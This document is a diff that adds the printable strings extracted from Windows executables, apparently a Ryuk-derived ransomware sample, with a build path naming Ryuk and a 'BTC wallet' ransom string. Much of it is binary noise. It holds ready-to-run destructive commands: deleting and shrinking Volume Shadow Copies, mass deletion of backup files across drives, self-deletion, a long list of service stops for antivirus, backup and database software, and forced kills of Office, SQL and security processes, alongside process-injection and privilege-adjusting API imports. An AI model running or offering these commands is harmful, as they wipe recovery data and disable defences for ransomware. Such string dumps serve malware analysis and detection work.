@@ -1,0 +1,1960 @@
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+.gfids
+@.reloc
+WSSWWh
+PPPh  A
+URPQQhP)@
+;t$,v-
+UQPXY]Y[
+WWWPWS
+u-PWWS
+PQhH"A
+PQhP#A
+SSVWh 
+f9:t!V
+QQSWj0j@
+PPPPPPPP
+PPPPPWS
+PP9E u:PPVWP
+Main Invoked.
+Main Returned.
+EventRegister
+EventSetInformation
+EventUnregister
+EventWriteTransfer
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+CorExitProcess
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+GetCurrentPackageId
+LCMapStringEx
+LocaleNameToLCID
+?5Wg4p
+%S#[k=
+"B <1=
+_hypot
+_nextafter
+kernel32.dll
+IsWow64Process
+InvokeMainViaCRT
+"Main Invoked."
+FileName
+ExitMainViaCRT
+"Main Returned."
+FileName
+Microsoft.CRTProvider
+.text$mn
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$sxdata
+.rdata$zETW0
+.rdata$zETW1
+.rdata$zETW2
+.rdata$zETW9
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.gfids$x
+.gfids$y
+GetCurrentProcess
+WriteFile
+GetModuleFileNameW
+CreateFileW
+GetVersionExW
+LoadLibraryA
+CloseHandle
+GetWindowsDirectoryW
+GetProcAddress
+FreeLibrary
+GetTickCount
+KERNEL32.dll
+ShellExecuteW
+SHELL32.dll
+QueryPerformanceCounter
+GetCurrentProcessId
+GetCurrentThreadId
+GetSystemTimeAsFileTime
+InitializeSListHead
+IsDebuggerPresent
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetStartupInfoW
+IsProcessorFeaturePresent
+GetModuleHandleW
+TerminateProcess
+GetLastError
+InitializeCriticalSectionAndSpinCount
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+LoadLibraryExW
+RtlUnwind
+SetLastError
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+GetStdHandle
+GetModuleFileNameA
+MultiByteToWideChar
+WideCharToMultiByte
+ExitProcess
+GetModuleHandleExW
+GetACP
+HeapFree
+HeapAlloc
+FindClose
+FindFirstFileExA
+FindNextFileA
+IsValidCodePage
+GetOEMCP
+GetCPInfo
+GetCommandLineA
+GetCommandLineW
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+LCMapStringW
+SetStdHandle
+GetFileType
+GetStringTypeW
+GetProcessHeap
+HeapSize
+HeapReAlloc
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+SetFilePointerEx
+WriteConsoleW
+DecodePointer
+RaiseException
+SystemFunction036
+ADVAPI32.dll
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+.pdata
+@.gfids
+@.rsrc
+@.reloc
+x ATAVAWH
+@A_A^A\
+L$ SVWH
+\$DtXH
+WATAUAVAW
+fD9,Hu
+A_A^A]A\_
+|$ UATAUAVAWH
+A_A^A]A\]
+uRfD95
+NfD95U
+4OfD95
+fD9T$Jt
+fD9T$Jt
+f9t$Jt
+@USVWAVH
+L9l$Xu
+|$p@KL
+|$T@8}
+|$p@KL
+A^_^[]
+@USVWH
+UATAUAVAWH
+A_A^A]A\]
+UATAUAVAWH
+t$xf9u
+A_A^A]A\]
+UAVAWH
+ H3E H3E
+WATAUAVAWH
+A_A^A]A\_
+WATAUAVAWH
+ A_A^A]A\_
+u3HcH<H
+D$@H;G
+S,, <Zw
+CA< t(<#t
+<htr<jtb<lt6<tt&<wt
+!,X< w
+t$ WAVAWH
+s4+sP+
+0A_A^_
+WAVAWH
+ A_A^_
+@8|$Pt
+x ATAVAWH
+ A_A^A\
+UVWAVAWH
+0A_A^_^]
+WAVAWH
+A86taH
+0A_A^_
+L$ WATAUAVAWH
+@A_A^A]A\_
+x ATAVAWH
+ A_A^A\
+|$ UATAUAVAWH
+A_A^A]A\]
+WATAUAVAWH
+ A_A^A]A\_
+WAVAWH
+@A_A^_
+fD9t$b
+D82u&H
+D8t$Ht
+x ATAVAWH
+gfffffffH
+D8d$ht
+A_A^A\
+WATAUAVAWH
+A_A^A]A\_
+UVWATAUAVAWH
+`A_A^A]A\_^]
+x ATAVAWH
+0A_A^A\
+\$ UVWAVAWH
+A_A^_^]
+@8|$^t
+l$ VWATAVAWH
+L$&@8t$&t0@8q
+A81t@@8r
+A_A^A\_^
+fD94Fu
+@UATAUAVAWH
+e0A_A^A]A\]
+SVWATAUAWH
+HA_A]A\_^[
+UVWATAUAVAWH
+A_A^A]A\_^]
+VWATAVAW
+A_A^A\_^
+WATAUAVAWH
+ A_A^A]A\_
+\$ UVWATAUAVAWH
+H!D$ E
+`A_A^A]A\_^]
+@UATAUAVAWH
+H!T$0D
+uf!T$(H!T$ 
+A_A^A]A\]
+@USVWATAUAVAWH
+D8l$ht
+A_A^A]A\_^[]
+l$ WAVAWH
+ A_A^_
+@UATAVH
+WATAUAVAWH
+ A_A^A]A\_
+ffffff
+fffffff
+|$ ATAVAWH
+\$@@8=!
+ A_A^A\
+USVWAVH
+A^_^[]
+LcA<E3
+Main Invoked.
+Main Returned.
+EventRegister
+EventSetInformation
+EventUnregister
+EventWriteTransfer
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+CorExitProcess
+`h````
+xpxxxx
+(null)
+GetCurrentPackageId
+LCMapStringEx
+LocaleNameToLCID
+NAN(SNAN)
+nan(snan)
+NAN(IND)
+nan(ind)
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+[aOni*{
+~ $s%r
+@b;zO]
+v2!L.2
+1#QNAN
+1#SNAN
+UUUUUU
+UUUUUU
+=imb;D
+/>58d%
+VM>cQ6
+>jtm}S
+)>6{1n
++f)>0'
+;H9>&X
+*StO9>T
+n03>Pu
+K~Je#>!
+bp(=>?g
+BC?>6t9^
+K&>.yC
+.xJ>Hf
+y\PD>!
+|b=})>
+c [1>H'
+uzKs@>
+3>N;kU
+kE>fvw
+V6E>`"(5
+?UUUUUU
+?7zQ6$
+LookupPrivilegeValue error: %u
+AdjustTokenPrivileges error: %u
+The token does not have the specified privilege. 
+Iphlpapi.dll
+GetLastError
+GetSystemDefaultLangID
+WaitForMultipleObjects
+GetFileSizeEx
+MoveFileExW
+SetFilePointerEx
+CreateThread
+vssadmin Delete Shadows /all /quiet
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
+vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
+vssadmin Delete Shadows /all /quiet
+del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk
+del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk
+del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk
+del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk
+del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk
+del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk
+del %0
+kernel32.dll
+IsWow64Process
+iqkZsdgHinxGGBvFmNpmoSLAqENMcGqmniHObRwwXfiMWVDJCmYKByrUwyKSMnJFjRwLKYnzrNkFjhWscRP
+dNhQzfRKcUwcXxSGfsvZKXlGTGQqZhmViyKAfpRiituTRpLhjUsjoNvbixhehKRIEarSkKhtDJJOSidgLecKydihTYJLimypuSklidnKLAFlOScBmBdtSVcAurVBhtIqPhCcTbjpwVZfCfqYPWaNfavnAhZeEUjgrCudoPDCYbBtkttWAKYZtbrRdzRdcwfdTSDuOWDmfqfgOUNYTkXmUliTFBPUDBNPgZdUbiLrTxcfzxUKyXNWEbLXwkvgltmHtkyoDrtYWHoCMHMkaAFPjGxEzszhOBeRwjxwzSfEZCNpRKzoNPJtwKMbrjpmjbogyzTbKwupLBnyXgtsUXiPNGORdMNRzeEhAmPSMawcZsuRsQwTqiDSHHoaiWfsdXKmgNclsATJtLCGPaPjfrjVbHDmQHIJhxxHFiyQLpyFzqXaELRxRdNuxPpYBlnaHkuFLBLBUhkosPrQZUuTMkSAFNmqVFlOMPqxqvzsBkahIXEMinIXoSCoiVVLakaXuVDHHRQbibrHuZxPQCkihrpzcSyhPDeecOyJtWmkjhfqMIorhsLfxXRrmNabsbXcQRrrkhBwIfSRTnKXDtjrAKZwJMaeHqnYKpugmqSMMpNimlgjiTForiJZjUQLoaUhmLpXVmYRsgZGOgepClcHFzmRBHZHiDTKUFBtqzcHqbfCfoIrBTZeSufxEleUNBmWJVUqIBNvtZnbGGhjITbigTNODQumzJprnIVVdNoVXdfIDWSgRbDUlrFSlKuaBvBygEWRYNbPdTpXdfKKJyCbdXisGuvXiadHcyEmRsPVwROBAzJlMEKuAqeThmvJuXzUOIdWYaiqkGLlreHCpMSBkXBfyPCUfGGDiDKEhzCFTkMvbSzRfkfLGOVDoSeNBixzQerJDMnRbktbPzcyfkqvyDesWkBnGUnstpAPQYFDhDtQdlzTLWBhQRKzkUoxndTEProrWtmfaGHPMqqqqmGqOChfuKPNBYmrWzajykJokKSUSsAkMpbcSegnTQxecqdUsVxr
+InvokeMainViaCRT
+"Main Invoked."
+FileName
+ExitMainViaCRT
+"Main Returned."
+FileName
+Microsoft.CRTProvider
+C:\Users\Admin\Documents\Visual Studio 2015\Projects From Ryuk\ConsoleApplication54\x64\Release\ConsoleApplication54.pdb
+.text$mn
+.text$mn$00
+.text$x
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$zETW0
+.rdata$zETW1
+.rdata$zETW2
+.rdata$zETW9
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.xdata
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.pdata
+.gfids$x
+.gfids$y
+.rsrc$01
+.rsrc$02
+WriteProcessMemory
+HeapFree
+SetLastError
+GetCommandLineW
+GetCurrentProcess
+GetModuleFileNameW
+CreateFileW
+GetVersionExW
+GetModuleHandleA
+OpenProcess
+CreateToolhelp32Snapshot
+GetLastError
+Process32NextW
+GetCurrentThread
+LoadLibraryA
+GlobalAlloc
+DeleteFileW
+Process32FirstW
+GlobalFree
+CloseHandle
+HeapAlloc
+GetWindowsDirectoryW
+GetProcAddress
+VirtualAllocEx
+LocalFree
+GetProcessHeap
+FreeLibrary
+CreateRemoteThread
+VirtualFreeEx
+KERNEL32.dll
+GetTokenInformation
+LookupAccountSidW
+OpenThreadToken
+OpenProcessToken
+ImpersonateSelf
+AdjustTokenPrivileges
+LookupPrivilegeValueW
+ADVAPI32.dll
+ShellExecuteW
+CommandLineToArgvW
+SHELL32.dll
+RtlCaptureContext
+RtlLookupFunctionEntry
+RtlVirtualUnwind
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+TerminateProcess
+IsProcessorFeaturePresent
+QueryPerformanceCounter
+GetCurrentProcessId
+GetCurrentThreadId
+GetSystemTimeAsFileTime
+InitializeSListHead
+IsDebuggerPresent
+GetStartupInfoW
+GetModuleHandleW
+RtlUnwindEx
+RaiseException
+InitializeCriticalSectionAndSpinCount
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+LoadLibraryExW
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+ExitProcess
+GetModuleHandleExW
+GetStdHandle
+WriteFile
+GetModuleFileNameA
+MultiByteToWideChar
+WideCharToMultiByte
+GetACP
+LCMapStringW
+GetFileType
+FindClose
+FindFirstFileExA
+FindNextFileA
+IsValidCodePage
+GetOEMCP
+GetCPInfo
+GetCommandLineA
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+SetStdHandle
+GetStringTypeW
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+HeapSize
+HeapReAlloc
+SetFilePointerEx
+WriteConsoleW
+SystemFunction036
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+cies\System\
+%x?f`w
+stop "Acronis VSS Provider" /y
+stop "Enterprise Client Service" /y
+stop "Sophos Agent" /y
+stop "Sophos AutoUpdate Service" /y
+stop "Sophos Clean Service" /y
+stop "Sophos Device Control Service" /y
+stop "Sophos File Scanner Service" /y
+stop "Sophos Health Service" /y
+stop "Sophos MCS Agent" /y
+stop "Sophos MCS Client" /y
+stop "Sophos Message Router" /y
+stop "Sophos Safestore Service" /y
+stop "Sophos System Protection Service" /y
+stop "Sophos Web Control Service" /y
+stop "SQLsafe Backup Service" /y
+stop "SQLsafe Filter Service" /y
+stop "Symantec System Recovery" /y
+stop "Veeam Backup Catalog Data Service" /y
+stop AcronisAgent /y
+stop AcrSch2Svc /y
+stop Antivirus /y
+stop ARSM /y
+stop BackupExecAgentAccelerator /y
+stop BackupExecAgentBrowser /y
+stop BackupExecDeviceMediaService /y
+stop BackupExecJobEngine /y
+stop BackupExecManagementService /y
+stop BackupExecRPCService /y
+stop BackupExecVSSProvider /y
+stop bedbg /y
+stop DCAgent /y
+stop EPSecurityService /y
+stop EPUpdateService /y
+stop EraserSvc11710 /y
+stop EsgShKernel /y
+stop FA_Scheduler /y
+stop IISAdmin /y
+stop IMAP4Svc /y
+stop macmnsvc /y
+stop masvc /y
+stop MBAMService /y
+stop MBEndpointAgent /y
+stop McAfeeEngineService /y
+stop McAfeeFramework /y
+stop McAfeeFrameworkMcAfeeFramework /y
+stop McShield /y
+stop McTaskManager /y
+stop mfemms /y
+stop mfevtp /y
+stop MMS /y
+stop mozyprobackup /y
+stop MsDtsServer /y
+stop MsDtsServer100 /y
+stop MsDtsServer110 /y
+stop MSExchangeES /y
+stop MSExchangeIS /y
+stop MSExchangeMGMT /y
+stop MSExchangeMTA /y
+stop MSExchangeSA /y
+stop MSExchangeSRS /y
+stop MSOLAP$SQL_2008 /y
+stop MSOLAP$SYSTEM_BGC /y
+stop MSOLAP$TPS /y
+stop MSOLAP$TPSAMA /y
+stop MSSQL$BKUPEXEC /y
+stop MSSQL$ECWDB2 /y
+stop MSSQL$PRACTICEMGT /y
+stop MSSQL$PRACTTICEBGC /y
+stop MSSQL$PROFXENGAGEMENT /y
+stop MSSQL$SBSMONITORING /y
+stop MSSQL$SHAREPOINT /y
+stop MSSQL$SQL_2008 /y
+stop MSSQL$SYSTEM_BGC /y
+stop MSSQL$TPS /y
+stop MSSQL$TPSAMA /y
+stop MSSQL$VEEAMSQL2008R2 /y
+stop MSSQL$VEEAMSQL2012 /y
+stop MSSQLFDLauncher /y
+stop MSSQLFDLauncher$PROFXENGAGEMENT /y
+stop MSSQLFDLauncher$SBSMONITORING /y
+stop MSSQLFDLauncher$SHAREPOINT /y
+stop MSSQLFDLauncher$SQL_2008 /y
+stop MSSQLFDLauncher$SYSTEM_BGC /y
+stop MSSQLFDLauncher$TPS /y
+stop MSSQLFDLauncher$TPSAMA /y
+stop MSSQLSERVER /y
+stop MSSQLServerADHelper100 /y
+stop MSSQLServerOLAPService /y
+stop MySQL80 /y
+stop MySQL57 /y
+stop ntrtscan /y
+stop OracleClientCache80 /y
+stop PDVFSService /y
+stop POP3Svc /y
+stop ReportServer /y
+stop ReportServer$SQL_2008 /y
+stop ReportServer$SYSTEM_BGC /y
+stop ReportServer$TPS /y
+stop ReportServer$TPSAMA /y
+stop RESvc /y
+stop sacsvr /y
+stop SamSs /y
+stop SAVAdminService /y
+stop SAVService /y
+stop SDRSVC /y
+stop SepMasterService /y
+stop ShMonitor /y
+stop Smcinst /y
+stop SmcService /y
+stop SMTPSvc /y
+stop SNAC /y
+stop SntpService /y
+stop sophossps /y
+stop SQLAgent$BKUPEXEC /y
+stop SQLAgent$ECWDB2 /y
+stop SQLAgent$PRACTTICEBGC /y
+stop SQLAgent$PRACTTICEMGT /y
+stop SQLAgent$PROFXENGAGEMENT /y
+stop SQLAgent$SBSMONITORING /y
+stop SQLAgent$SHAREPOINT /y
+stop SQLAgent$SQL_2008 /y
+stop SQLAgent$SYSTEM_BGC /y
+stop SQLAgent$TPS /y
+stop SQLAgent$TPSAMA /y
+stop SQLAgent$VEEAMSQL2008R2 /y
+stop SQLAgent$VEEAMSQL2012 /y
+stop SQLBrowser /y
+stop SQLSafeOLRService /y
+stop SQLSERVERAGENT /y
+stop SQLTELEMETRY /y
+stop SQLTELEMETRY$ECWDB2 /y
+stop SQLWriter /y
+stop SstpSvc /y
+stop svcGenericHost /y
+stop swi_filter /y
+stop swi_service /y
+stop swi_update_64 /y
+stop TmCCSF /y
+stop tmlisten /y
+stop TrueKey /y
+stop TrueKeyScheduler /y
+stop TrueKeyServiceHelper /y
+stop UI0Detect /y
+stop VeeamBackupSvc /y
+stop VeeamBrokerSvc /y
+stop VeeamCatalogSvc /y
+stop VeeamCloudSvc /y
+stop VeeamDeploymentService /y
+stop VeeamDeploySvc /y
+stop VeeamEnterpriseManagerSvc /y
+stop VeeamMountSvc /y
+stop VeeamNFSSvc /y
+stop VeeamRESTSvc /y
+stop VeeamTransportSvc /y
+stop W3Svc /y
+stop wbengine /y
+stop WRSVC /y
+stop MSSQL$VEEAMSQL2008R2 /y
+stop SQLAgent$VEEAMSQL2008R2 /y
+stop VeeamHvIntegrationSvc /y
+stop swi_update /y
+stop SQLAgent$CXDB /y
+stop SQLAgent$CITRIX_METAFRAME /y
+stop "SQL Backups" /y
+stop MSSQL$PROD /y
+stop "Zoolz 2 Service" /y
+stop MSSQLServerADHelper /y 
+stop SQLAgent$PROD /y 
+stop msftesql$PROD /y 
+stop NetMsmqActivator /y
+stop EhttpSrv /y
+stop ekrn /y
+stop ESHASRV /y
+stop MSSQL$SOPHOS /y
+stop SQLAgent$SOPHOS /y
+stop AVP /y
+stop klnagent /y
+stop MSSQL$SQLEXPRESS /y
+stop SQLAgent$SQLEXPRESS /y
+stop wbengine /y
+stop kavfsslp /y
+stop KAVFSGT /y
+stop KAVFS /y
+stop mfefire /y
+55>_e0??
+55>_e&3:
+=&( 4
+%%?'"4
+6,ZcL>%
+%XQRR@
+%BxkIs
+2GtALl1>
+6!j'2
+G,:>01
+t4'=:2'*|G)
+!'C\BD@,7X
+;X}P?+
+?l )b1
+Q5> ?S6
+=U0-$-!
+oc&=h;
+a$<W>%
+?(>^Cc`f3
+M'1h;<i
+BTC wallet:
+d4?!A-z
+j)86G2' |
+%BxkIt6
+%BxkIt2
+d4?!A-z
+j)82@)2!}
+D:poY*H
+No system is safe
+/IM zoolz.exe /F
+/IM agntsvc.exe /F
+/IM dbeng50.exe /F
+/IM dbsnmp.exe /F
+/IM encsvc.exe /F
+/IM excel.exe /F
+/IM firefoxconfig.exe /F
+/IM infopath.exe /F
+/IM isqlplussvc.exe /F
+/IM msaccess.exe /F
+/IM msftesql.exe /F
+/IM mspub.exe /F
+/IM mydesktopqos.exe /F
+/IM mydesktopservice.exe /F
+/IM mysqld.exe /F
+/IM mysqld-nt.exe /F
+/IM mysqld-opt.exe /F
+/IM ocautoupds.exe /F
+/IM ocomm.exe /F
+/IM ocssd.exe /F
+/IM onenote.exe /F
+/IM oracle.exe /F
+/IM outlook.exe /F
+/IM powerpnt.exe /F
+/IM sqbcoreservice.exe /F
+/IM sqlagent.exe /F
+/IM sqlbrowser.exe /F
+/IM sqlservr.exe /F
+/IM sqlwriter.exe /F
+/IM steam.exe /F
+/IM synctime.exe /F
+/IM tbirdconfig.exe /F
+/IM thebat.exe /F
+/IM thebat64.exe /F
+/IM thunderbird.exe /F
+/IM visio.exe /F
+/IM winword.exe /F
+/IM wordpad.exe /F
+/IM xfssvccon.exe /F
+/IM tmlisten.exe /F
+/IM PccNTMon.exe /F
+/IM CNTAoSMgr.exe /F
+/IM Ntrtscan.exe /F
+/IM mbamtray.exe /F
+ZUKUx}"K
+g*SqM5'T2Xzf
+5;T5Xzf
+?_>sI~
+5;T4Xzf
+?_?sI~
+g,SqM7(
+g/SqM7(
+ ,TeRk
+#_<sI~
+#_=sI~
+g.SqM5'T6Xzf
+g!SqM5'T9Xzf
+2B9s5{L8(
+%B9s5{L8"
+*cG{B9s5{L),
+6iF"Bu/I~
+B>s5{L8(
+qM<iF B?s5{L
+*cG{B?s53
+!HtcI4X
+=Bu:I~
+?B<s5{L>:
+qM)iF7Bu8I6X
+:B=s5{L-+
+!HtcI6X
+%B=s5{L- 
+2B2s5{L8(
+%B2s5{L8"
+*cG{B2s5{L),
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level='asInvoker' uiAccess='false' />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+.gfids
+<SLv8j
+w"Ph@B
+D$(PWj
+SVWjdP
+URPQQh
+;t$,v-
+UQPXY]Y[
+^$+^8+
+Wj0XPV
+WWWPWS
+u-PWWS
+SSVWh 
+f9:t!V
+QQSWj0j@
+PPPPPWS
+PP9E u:PPVWP
+PPPPPPPP
+0Main Invoked.
+Main Returned.
+EventRegister
+EventSetInformation
+EventUnregister
+EventWriteTransfer
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+0__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+CorExitProcess
+`h````
+xpxxxx
+(null)
+GetCurrentPackageId
+LCMapStringEx
+LocaleNameToLCID
+NAN(SNAN)
+nan(snan)
+NAN(IND)
+nan(ind)
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+[aOni*{
+~ $s%r
+@b;zO]
+v2!L.2
+1#QNAN
+1#SNAN
+?5Wg4p
+%S#[k=
+"B <1=
+_hypot
+_nextafter
+LookupPrivilegeValue error: %u
+AdjustTokenPrivileges error: %u
+The token does not have the specified privilege. 
+Iphlpapi.dll
+GetLastError
+GetSystemDefaultLangID
+WaitForMultipleObjects
+GetFileSizeEx
+MoveFileExW
+SetFilePointerEx
+CreateThread
+vssadmin Delete Shadows /all /quiet
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
+vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
+vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
+vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
+vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
+vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
